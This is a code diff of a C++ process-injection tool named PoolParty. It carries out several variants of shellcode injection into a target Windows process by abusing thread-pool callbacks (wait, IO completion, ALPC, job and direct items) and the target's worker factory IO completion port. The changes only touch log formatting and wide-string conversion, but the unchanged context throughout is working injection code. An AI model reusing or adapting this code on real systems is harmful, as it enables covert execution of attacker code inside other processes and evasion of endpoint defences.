@@ -1,5 +1,7 @@
 #include "PoolParty.hpp"
 
+std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> g_WideString_Converter;
+
 PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode) {
 	m_dwTargetPid = dwTargetPid;
 	m_cShellcode = cShellcode;
@@ -123,7 +125,7 @@ void RemoteWaitCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port :%d") % *p_hIoCompletion;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;
 
 	const auto pWait = w_CreateThreadpoolWait(static_cast<PTP_WAIT_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
 	BOOST_LOG_TRIVIAL(info) << "Created TP_WAIT structure associated with the shellcode";
@@ -139,7 +141,7 @@ void RemoteWaitCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Written the TP_DIRECT structure to the target process";
 
 	const auto p_hEvent = w_CreateEvent(nullptr, FALSE, FALSE, const_cast<LPWSTR>(POOL_PARTY_EVENT_NAME));
-	BOOST_LOG_TRIVIAL(info) << boost::format("Created event with name `%S`") % POOL_PARTY_EVENT_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Created event with name `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_EVENT_NAME);
 
 	w_ZwAssociateWaitCompletionPacket(pWait->WaitPkt, *p_hIoCompletion, *p_hEvent, RemoteDirectAddress, RemoteWaitAddress, 0, 0, nullptr);
 	BOOST_LOG_TRIVIAL(info) << "Associated event with the IO completion port of the target process worker factory";
@@ -159,10 +161,10 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port :%d") % *p_hIoCompletion;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;
 
 	const auto p_hFile = w_CreateFile(POOL_PARTY_FILE_NAME, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Created file: `%ws`") % POOL_PARTY_FILE_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Created file: `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);
 
 	const auto pTpIo = w_CreateThreadpoolIo(*p_hFile, static_cast<PTP_WIN32_IO_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
 	BOOST_LOG_TRIVIAL(info) << "Created TP_IO structure associated with the shellcode";
@@ -183,7 +185,7 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution() const
 	FileIoCopmletionInformation.Port = *p_hIoCompletion;
 	FileIoCopmletionInformation.Key = &RemoteIoAddress->Direct;
 	w_ZwSetInformationFile(*p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Associated file `%ws` with the IO completion port of the target process worker factory") % POOL_PARTY_FILE_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Associated file `%s` with the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);
 
 	const std::string Buffer =
 		"Dive right in and make a splash,\n"
@@ -193,7 +195,7 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution() const
 	const auto BufferLength = Buffer.length();
 	OVERLAPPED Overlapped = { 0 };
 	w_WriteFile(*p_hFile, Buffer.c_str(), BufferLength, nullptr, &Overlapped);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Write to file `%ws` to queue a packet to the IO completion port of the target process worker factory") % POOL_PARTY_FILE_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Write to file `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);
 }
 
 RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
@@ -208,7 +210,7 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port :%d") % *p_hIoCompletion;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;
 	
 	/* 
 		Since we can not re-set the ALPC object IO completion port, we are creating a temporary ALPC object that will only be used to allocate a TP_ALPC structure
@@ -238,7 +240,7 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 	AlpcPortAttributes.MaxMessageLength = 328;
 
 	const auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party ALPC port `%ws`: %d") % POOL_PARTY_ALPC_PORT_NAME % hAlpcConnectionPort;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party ALPC port `%s`: %d") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME) % hAlpcConnectionPort;
 
 	pTpAlpc->AlpcPort = hAlpcConnectionPort;
 	
@@ -251,7 +253,7 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 	AlpcPortAssociateCopmletionPort.CompletionKey = RemoteTpAlpcAddress;
 	AlpcPortAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;
 	w_NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
-	BOOST_LOG_TRIVIAL(info) << boost::format("Associated ALPC port `%ws` with the IO completion port of the target process worker factory") % POOL_PARTY_ALPC_PORT_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Associated ALPC port `%s` with the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME);
 
 	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
 	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
@@ -286,7 +288,7 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 		nullptr,
 		&liTimeout
 	);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Connect to ALPC port `%ws` to queue a packet to the IO completion port of the target process worker factory") % POOL_PARTY_ALPC_PORT_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Connected to ALPC port `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME);
 }
 
 RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
@@ -300,10 +302,10 @@ void RemoteJobCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port :%d") % *p_hIoCompletion;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;
 
 	const auto p_hJob = w_CreateJobObject(nullptr, const_cast<LPWSTR>(POOL_PARTY_JOB_NAME));
-	BOOST_LOG_TRIVIAL(info) << boost::format("Created job object with name `%S`") % POOL_PARTY_JOB_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Created job object with name `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
 
 	const auto pTpJob = w_TpAllocJobNotification(*p_hJob, m_ShellcodeAddress, nullptr, nullptr);
 	BOOST_LOG_TRIVIAL(info) << "Created TP_JOB structure associated with the shellcode";
@@ -316,16 +318,16 @@ void RemoteJobCallbackInsertion::SetupExecution() const
 	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
 
 	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
-	BOOST_LOG_TRIVIAL(info) << boost::format("Zeroed out job object `%ws` IO completion port") % POOL_PARTY_JOB_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Zeroed out job object `%s` IO completion port") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
 
 	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
 	JobAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;
 
 	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
-	BOOST_LOG_TRIVIAL(info) << boost::format("Associated job object `%ws` with the IO completion port of the target process worker factory") % POOL_PARTY_JOB_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Associated job object `%s` with the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
 
 	w_AssignProcessToJobObject(*p_hJob, GetCurrentProcess());
-	BOOST_LOG_TRIVIAL(info) << boost::format("Assign current process to job object `%ws` to queue a packet to the IO completion port of the target process worker factory") % POOL_PARTY_JOB_NAME;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Assigned current process to job object `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
 }
 
 RemoteDirectCallbackInsertion::RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
@@ -339,7 +341,7 @@ void RemoteDirectCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	const auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port :%d") % *p_hIoCompletion;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Duplicated a handle to the target process worker factory IO completion port: %d") % *p_hIoCompletion;
 
 	TP_DIRECT Direct = { 0 };
 	Direct.Callback = m_ShellcodeAddress;
